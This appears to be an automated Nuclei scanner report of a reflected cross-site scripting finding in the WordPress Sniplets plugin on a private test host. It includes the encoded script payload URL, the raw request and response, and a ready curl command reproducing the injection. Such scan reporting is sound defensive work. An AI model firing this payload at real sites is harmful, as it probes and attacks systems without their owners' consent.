### Wordpress Plugin Sniplets - Cross-Site Scripting (sniplets-xss) found on http://192.168.198.179:8080/
---
**Details**: **sniplets-xss**  matched at http://192.168.198.179:8080/

**Protocol**: HTTP

**Full URL**: http://192.168.198.179:8080/wp-content/plugins/sniplets/view/sniplets/warning.php?text=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

**Timestamp**: Wed Jun 8 20:22:07 +0100 BST 2022

**Template Information**

| Key | Value |
|---|---|
| Name | Wordpress Plugin Sniplets - Cross-Site Scripting |
| Authors | dhiyaneshdk |
| Tags | xss, wordpress, wp-plugin, wp |
| Severity | medium |
| Description | Cross-site scripting (XSS) on Wordpress Plugin Sniplets |

**Request**
```http
GET /wp-content/plugins/sniplets/view/sniplets/warning.php?text=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: 192.168.198.179:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.0 200 OK
Connection: close
Content-Length: 249
Content-Type: text/html

<HTML><HEAD><TITLE>File Not Found</TITLE></HEAD><BODY><H1>Cannot find this file.</H1>The requested file: <B>/wp-content/plugins/sniplets/view/sniplets/warning.php?text=</script><script>alert(document.domain)</script></B> was not found.</BODY></HTML>
```

References: 
- https://www.exploit-db.com/exploits/5194

**CURL Command**
```
curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36' 'http://192.168.198.179:8080/wp-content/plugins/sniplets/view/sniplets/warning.php?text=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
```
---
Generated by [Nuclei 2.7.1](https://github.com/projectdiscovery/nuclei)